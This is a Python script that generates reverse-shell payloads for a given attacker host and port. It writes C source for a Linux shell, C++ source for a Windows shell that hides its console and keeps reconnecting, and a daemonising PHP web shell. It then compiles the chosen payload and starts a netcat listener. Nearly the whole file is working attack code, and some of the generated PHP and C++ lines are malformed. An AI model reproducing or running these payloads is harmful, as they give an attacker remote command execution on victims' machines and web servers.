#!/usr/bin/python3

import os
from time import sleep
import sys
import subprocess

class bcolors:

    BLUE = '\033[94m'
    GREEN = '\033[92m'
    RED = '\033[31m'
    YELLOW = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    BGRED = '\033[41m'
    WHITE = '\033[37m'

banner = """
   ________  __    __    _______   ____     ____    _______   __    _____  ___   
  /"      ")/" |  | "\  /" __   ) /  " \   /  " \  |   _  "\ |" \  ( "   \|"  \  
 (:   //\_/(:  (__)  :)(__/ _) .//__|| |  /__|| |  (. |_)  :)||  | |.\    \    | 
  \___ \    \/      \/     /  //    |: |     |: |  |:     \/ |:  | |: \.   \   | 
  __ |  \   //  __   \  __ \_  \   _\  |    _\  |  (|  _  \  |.  | |.  \    \. | 
 /" \/  :) (:  (  )  :)(: \__) :\ /" \_|\  /" \_|\ |: |_)  :)/\  |\|    \    \ | 
(_______/   \__|  |__/  \_______)(_______)(_______)(_______/(__\_|_)\___|\____\) 
                                                                                 
"""

def init():
    print(bcolors.RED)    
    print(banner)
    print(bcolors.ENDC)
    print(bcolors.GREEN)
    text = "ReverseShell Binary Auto generater in C language\n\n"

    for i in text:
        print(i,end="",flush=True)
        sleep(0.02)

    del text
    print(bcolors.ENDC)
    if len(sys.argv) != 4:
        
        print(bcolors.RED)

        print("[!]More Args!!!!!!")
        print(f"[+]Usage: {sys.argv[0]} <lhost> <lport> <file_type>")
        print(f"[+]Example: {sys.argv[0]} 192.168.0.4 1337 elf")
        print(f"[+]Example: {sys.argv[0]} 192.168.0.4 1337 exe")
        print(f"[+]Example: {sys.argv[0]} 192.168.0.4 1337 php")
        print(bcolors.ENDC)
        
        sys.exit()

def host_and_port():
    lhost = sys.argv[1]
    lport = sys.argv[2]

    array = [lhost,lport]
    counter = 0

    for i in array:
        if len(i) > counter:
            counter = len(i)

    max_length = counter
    hatch = "+"+"-"*counter+"+"
    diff = max_length - len(lport)

    print(hatch)
    print(f"|{lhost}|<---LHOST")
    print(f"|{lport}"+" "*diff+"|<---LPORT")
    print(hatch)

    del array,counter,max_length,hatch,diff

    allow_range = [p for p in range(1,65536)]
    
    print(bcolors.RED)
    if int(lport) not in allow_range:
        print("[!]Invalid Number")
        print("[+]Port number: 1 - 65535")
        
        sys.exit()
    del allow_range
    return lhost,lport
    print(bcolors.ENDC)

def elf_write(lhost,lport):
    
    file_name = "shell.c"
    f = open(file_name,"w")
    f.write("#include <stdlib.h>\n")
    f.write("#include <unistd.h>\n")
    f.write("#include <netinet/in.h>\n")
    f.write("#include <arpa/inet.h>\n\n")
    f.write("int main(void){\n")
    f.write(f"int port = {int(lport)};\n")
    f.write("struct sockaddr_in revsockaddr;\n\n")
    f.write("int sockt = socket(AF_INET, SOCK_STREAM, 0);\n")
    f.write("revsockaddr.sin_family = AF_INET;\n")
    f.write("revsockaddr.sin_port = htons(port);\n")
    f.write(f"revsockaddr.sin_addr.s_addr = inet_addr(\"{lhost}\");\n\n")
    f.write("connect(sockt, (struct sockaddr *) &revsockaddr,\n")
    f.write("sizeof(revsockaddr));\n")
    f.write("dup2(sockt, 0);\n")
    f.write("dup2(sockt, 1);\n")
    f.write("dup2(sockt, 2);\n\n")
    f.write("char * const argv[] = {\"/bin/sh\", NULL};\n")
    f.write("execve(\"/bin/sh\", argv, NULL);\n\n")
    f.write("return 0;\n")
    f.write("}")
    f.close()
    
    print("[+]SourceCode Generated")


    del f
    return file_name


def exe_write(lhost,lport):

    file_name = "shell.cpp"
    f = open(file_name,"w")
    
    f.write("#include <winsock2.h>\n")
    f.write("#include <windows.h>\n")
    f.write("#include <ws2tcpip.h>\n")
    f.write("#pragma comment(lib, \"Ws2_32.lib\")\n")
    f.write("#define DEFAULT_BUFLEN 1024\n")

    f.write("void RunShell(char* C2Server, int C2Port) {\n")
    f.write("while(true) {\n")
    f.write("Sleep(5000);\n")

    f.write("SOCKET mySocket;\n")
    f.write("sockaddr_in addr;\n")
    f.write("WSADATA version;\n")
    f.write("WSAStartup(MAKEWORD(2,2), &version);\n")
    f.write("mySocket = WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);\n")
    f.write("addr.sin_family = AF_INET;\n")
   
    f.write("addr.sin_addr.s_addr = inet_addr(C2Server);\n")  
    f.write("addr.sin_port = htons(C2Port);\n")

    f.write("if (WSAConnect(mySocket, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL)==SOCKET_ERROR) {\n")
    f.write("closesocket(mySocket);\n")
    f.write("WSACleanup();\n")
    f.write("continue;\n")
    f.write("}\n")
    f.write("else {\n")
    f.write("char RecvData[DEFAULT_BUFLEN];\n")
    f.write("memset(RecvData, 0, sizeof(RecvData));\n")
    f.write("int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, 0);\n")
    f.write("if (RecvCode <= 0) {\n")
    f.write("closesocket(mySocket);\n")
    f.write("WSACleanup();\n")
    f.write("continue;\n")
    f.write("}\n")
    f.write("else {\n")
    f.write("char Process[] = \"\cmd.exe\\\";\n")
    f.write("STARTUPINFO sinfo;\n")
    f.write("PROCESS_INFORMATION pinfo;\n")
    f.write("memset(&sinfo, 0, sizeof(sinfo));\n")
    f.write("sinfo.cb = sizeof(sinfo);\n")
    f.write("sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);\n")
    f.write("sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) mySocket;\n")
    f.write("CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);\n")
    f.write("WaitForSingleObject(pinfo.hProcess, INFINITE);\n")
    f.write("CloseHandle(pinfo.hProcess);\n")
    f.write("CloseHandle(pinfo.hThread);\n")

    f.write("memset(RecvData, 0, sizeof(RecvData));\n")
    f.write("int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, 0);\n")
    f.write("if (RecvCode <= 0) {\n")
    f.write("closesocket(mySocket);\n")
    f.write("WSACleanup();\n")
    f.write("continue;\n")
    f.write("}\n")
    f.write("if (strcmp(RecvData, \"exit\\n\") == 0) {\n")
    f.write("exit(0);\n")
    f.write("}\n")
    f.write("}\n")
    f.write("}\n")
    f.write("}\n")
    f.write("}\n")

    f.write("int main(int argc, char **argv) {\n")
    f.write("FreeConsole();\n")
    f.write("if (argc == 3) {\n")
    f.write("int port  = atoi(argv[2]);\n") 
    f.write("RunShell(argv[1], port);\n")
    f.write("}\n")
    f.write("else {\n")
    f.write(f"char host[] = \"{lhost}\";\n")
    f.write(f"int port = {lport};//chnage this to your open port\n")
    f.write("RunShell(host, port);\n")
    f.write("}\n")
    f.write("return 0;\n")
    f.write("}\n")

    f.close()

    del f
    return file_name


def php_write(lhost,lport):

    file_name = "shell.php"
    f = open(file_name,"w")
    
    f.write("<?php class Sh\n")
    f.write("{\n")
    f.write("private $a = null;\n")
    f.write("private $p = null;\n")
    f.write("private $os = null;\n")
    f.write("private $sh = null;\n")
    f.write("private $ds = array(\n")
    f.write("0 => array(\n")
    f.write("'pipe',\n")
    f.write("'r'\n")
    f.write(") ,\n")
    f.write("1 => array(\n")
    f.write("'pipe',\n")
    f.write("'w'\n")
    f.write(") ,\n")
    f.write("2 => array(\n")
    f.write("'pipe',\n")
    f.write("'w'\n")
    f.write(")\n")
    f.write(");\n")
    f.write("private $o = array();\n")
    f.write("private $b = 1024;\n")
    f.write("private $c = 0;\n")
    f.write("private $e = false;\n")
    f.write("public function __construct($a, $p)\n")
    f.write("{\n")
    f.write("$this->a = $a;\n")
    f.write("$this->p = $p;\n")
    f.write("if (stripos(PHP_OS, 'LINUX') !== false)\n")
    f.write("{\n")
    f.write("$this->os = 'LINUX';\n")
    f.write("$this->sh = '/bin/sh';\n")
    f.write("}\n")
    f.write("else if (stripos(PHP_OS, 'WIN32') !== false || stripos(PHP_OS, 'WINNT') !== false || stripos(PHP_OS, 'WINDOWS') !== false)\n")
    f.write("{\n")
    f.write("$this->os = 'WINDOWS';\n")
    f.write("$this->sh = 'cmd.exe';\n")
    f.write("$this->o['bypass_shell'] = true;\n")
    f.write("}\n")
    f.write("else\n")
    f.write("{\n")
    f.write("$this->e = true;\n")
    f.write("echo \"SYS_ERROR: Underlying operating system is not supported, script will now exit...\\n\";\n")
    f.write("}\n")
    f.write("}\n")
    f.write("private function dem()\n")
    f.write("{\n")
    f.write("$e = false;\n")
    f.write("@error_reporting(0);\n")
    f.write("@set_time_limit(0);\n")
    f.write("if (!function_exists('pcntl_fork'))\n")
    f.write("{\n")
    f.write("echo \"DAEMONIZE: pcntl_fork() does not exists, moving on...\\n\";\n")
    f.write("}\n")
    f.write("else if (($p = @pcntl_fork()) < 0)\n")
    f.write("{\n")
    f.write("echo \"DAEMONIZE: Cannot fork off the parent process, moving on...\\n\";\n")
    f.write("}\n")
    f.write("else if ($p > 0)\n")
    f.write("{\n")
    f.write("$e = true;\n")
    f.write("echo \"DAEMONIZE: Child process forked off successfully, parent process will now exit...\\n\";\n")
    f.write("}\n")
    f.write("else if (posix_setsid() < 0)\n")
    f.write("{\n")
    f.write("echo \"DAEMONIZE: Forked off the parent process but cannot set a new SID, moving on as an orphan...\\n\";\n")
    f.write("}\n")
    f.write("else\n")
    f.write("{\n")
    f.write("echo \"DAEMONIZE: Completed successfully!\\n\";\n")
    f.write("}\n")
    f.write("@umask(0);\n")
    f.write("return $e;\n")
    f.write("}\n")
    f.write("private function d($d)\n")
    f.write("{\n")
    f.write("$d = str_replace('<', '<', $d);\n")
    f.write("$d = str_replace('>', '>', $d);\n")
    f.write("echo $d;\n")
    f.write("}\n")
    f.write("private function r($s, $n, $b)\n")
    f.write("{\n")
    f.write("if (($d = @fread($s, $b)) === false)\n")
    f.write("{\n")
    f.write("$this->e = true;\n")
    f.write("echo \"STRM_ERROR: Cannot read from ${n}, script will now exit...\\n\";\n")
    f.write("}\n")
    f.write("return $d;\n")
    f.write("}\n")
    f.write("private function w($s, $n, $d)\n")
    f.write("{\n")
    f.write("if (($by = @fwrite($s, $d)) === false)\n")
    f.write("{\n")
    f.write("$this->e = true;\n")
    f.write("echo \"STRM_ERROR: Cannot write to ${n}, script will now exit...\\n\";\n")
    f.write("}\n")
    f.write("return $by;\n")
    f.write("}\n")
    f.write("private function rw($i, $o, $in, $on)\n")
    f.write("{\n")
    f.write("while (($d = $this->r($i, $in, $this->b)) && $this->w($o, $on, $d))\n")
    f.write("{\n")
    f.write("if ($this->os === 'WINDOWS' && $on === 'STDIN')\n")
    f.write("{\n")
    f.write("$this->c += strlen($d);\n")
    f.write("}\n")
    f.write("$this->d($d);\n")
    f.write("}\n")
    f.write("}\n")
    f.write("private function brw($i, $o, $in, $on)\n")
    f.write("{\n")
    f.write("$s = fstat($i) ['size'];\n")
    f.write("if ($this->os === 'WINDOWS' && $in === 'STDOUT' && $this->c)\n")
    f.write("{\n")
    f.write("while ($this->c > 0 && ($by = $this->c >= $this->b ? $this->b : $this->c) && $this->r($i, $in, $by))\n")
    f.write("{\n")
    f.write("$this->c -= $by;\n")
    f.write("$s -= $by;\n")
    f.write("}\n")
    f.write("}\n")
    f.write("while ($s > 0 && ($by = $s >= $this->b ? $this->b : $s) && ($d = $this->r($i, $in, $by)) && $this->w($o, $on, $d))\n")
    f.write("{\n")
    f.write("$s -= $by;\n")
    f.write("$this->d($d);\n")
    f.write("}\n")
    f.write("}\n")
    f.write("public function rn()\n")
    f.write("{\n")
    f.write("if (!$this->e && !$this->dem())\n")
    f.write("{\n")
    f.write("$soc = @fsockopen($this->a, $this->p, $en, $es, 30);\n")
    f.write("if (!$soc)\n")
    f.write("{\n")
    f.write("echo \"SOC_ERROR: {$en}: {$es}\\n\";\n")
    f.write("}\n")
    f.write("else\n")
    f.write("{\n")
    f.write("stream_set_blocking($soc, false);\n")
    f.write("$proc = @proc_open($this->sh, $this->ds, $pps, '/', null, $this->o);\n")
    f.write("if (!$proc)\n")
    f.write("{\n")
    f.write("echo \"PROC_ERROR: Cannot start the shell\\n\";\n")
    f.write("}\n")
    f.write("else\n")
    f.write("{\n")
    f.write("foreach ($ps as $pp)\n")
    f.write("{\n")
    f.write("stream_set_blocking($pp, false);\n")
    f.write("}\n")
    f.write("@fwrite($soc, \"SOCKET: Shell has connected! PID: \" . proc_get_status($proc) ['pid'] . \"\\n\"\);\\n\")\n")
    f.write("do\n")
    f.write("{\n")
    f.write("if (feof($soc))\n")
    f.write("{\n")
    f.write("echo \"SOC_ERROR: Shell connection has been terminated\\n\";\n")
    f.write("break;\n")
    f.write("}\n")
    f.write("else if (feof($pps[1]) || !proc_get_status($proc) ['running'])\n")
    f.write("{\n")
    f.write("echo \"PROC_ERROR: Shell process has been terminated\\n\";\n")
    f.write("break;\n")
    f.write("}\n")
    f.write("$s = array(\n")
    f.write("'read' => array(\n")
    f.write("$soc,\n")
    f.write("$pps[1],\n")
    f.write("$pps[2]\n")
    f.write(") ,\n")
    f.write("'write' => null,\n")
    f.write("'except' => null\n")
    f.write(");\n")
    f.write("$ncs = @stream_select($s['read'], $s['write'], $s['except'], null);\n")
    f.write("if ($ncs === false)\n")
    f.write("{\n")
    f.write("echo \"STRM_ERROR: stream_select() failed\\n\";\n")
    f.write("break;\n")
    f.write("}\n")
    f.write("else if ($ncs > 0)\n")
    f.write("{\n")
    f.write("if ($this->os === 'LINUX')\n")
    f.write("{\n")
    f.write("if (in_array($soc, $s['read']))\n")
    f.write("{\n")
    f.write("$this->rw($soc, $pps[0], 'SOCKET', 'STDIN');\n")
    f.write("}\n")
    f.write("if (in_array($pps[2], $s['read']))\n")
    f.write("{\n")
    f.write("$this->rw($pps[2], $soc, 'STDERR', 'SOCKET');\n")
    f.write("}\n")
    f.write("if (in_array($pps[1], $s['read']))\n")
    f.write("{\n")
    f.write("$this->rw($pps[1], $soc, 'STDOUT', 'SOCKET');\n")
    f.write("}\n")
    f.write("}\n")
    f.write("else if ($this->os === 'WINDOWS')\n")
    f.write("{\n")
    f.write("if (in_array($soc, $s['read']))\n")
    f.write("{\n")
    f.write("$this->rw($soc, $pps[0], 'SOCKET', 'STDIN');\n")
    f.write("}\n")
    f.write("if (fstat($pps[2]) ['size'])\n")
    f.write("{\n")
    f.write("$this->brw($pps[2], $soc, 'STDERR', 'SOCKET');\n")
    f.write("}\n")
    f.write("if (fstat($pps[1]) ['size'])\n")
    f.write("{\n")
    f.write("$this->brw($pps[1], $soc, 'STDOUT', 'SOCKET');\n")
    f.write("}\n")
    f.write("}\n")
    f.write("}\n")
    f.write("}\n")
    f.write("while (!$this->e);\n")
    f.write("foreach ($pps as $pp)\n")
    f.write("{\n")
    f.write("fclose($pp);\n")
    f.write("}\n")
    f.write("proc_close($proc);\n")
    f.write("}\n")
    f.write("fclose($soc);\n")
    f.write("}\n")
    f.write("}\n")
    f.write("}\n")
    f.write("}\n")
    f.write("echo '<pre>';\n")
    f.write(f"$sh = new Sh('{lhost}', {lport});\n")
    f.write("$sh->rn();\n")
    f.write("echo '</pre>';\n")
    f.write("unset($sh);  ?>\n")

    f.close()

    del f

    return file_name

def format_setting():

    file_type = sys.argv[3]
    
    if file_type == "elf":

        f_format = "elf"
        
    elif file_type == "exe":

        f_format = "exe"

    elif file_type == "php":

        f_format = "php"

    else:

        print("[!]Invalid Value")
        print(bcolors.ENDC)
        print("Valid: \"elf\" or \"exe\" or \"php\"")
        sys.exit()
    
    
    return f_format

def compile(file_name,f_format):

    if f_format == "elf":

        try:
            compile_cmd = subprocess.getoutput(f"gcc {file_name} -o shell ")
        
            if "not found" in compile_cmd:
                print("[!]Could not Use gcc")
                print(bcolors.ENDC)
                sys.exit()    

        except:
            print("[!]Execption Occured")
            print(bcolors.ENDC)
            sys.exit()

    elif f_format == "exe":

        try:
            compile_cmd = subprocess.getoutput(f"i686-w64-mingw32-g++ {file_name} -o shell.exe -lws2_32 -lwininet -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc")

            if "not found" in compile_cmd:
                print("[!]Could not Use mingw")
                print(bcolors.ENDC)
                sys.exit()
        except:
            print("[!]Exception Occured")
            sys.exit()

    elif f_format == "php":

        print(f"{file_name} ---> generated")

    print("[+]Compile....Done")
    print(bcolors.ENDC)

def listener(lport):
    os.system(f"nc -lnvp {lport}")


if __name__ == "__main__":

    init()
    lhost,lport = host_and_port()
    f_format = format_setting()

    if f_format == "elf":
        file_name = elf_write(lhost,lport) 

    elif f_format == "exe":
        file_name = exe_write(lhost,lport)

    elif f_format == "php":
        file_name = php_write(lhost,lport)

    compile(file_name,f_format)
    listener(lport)
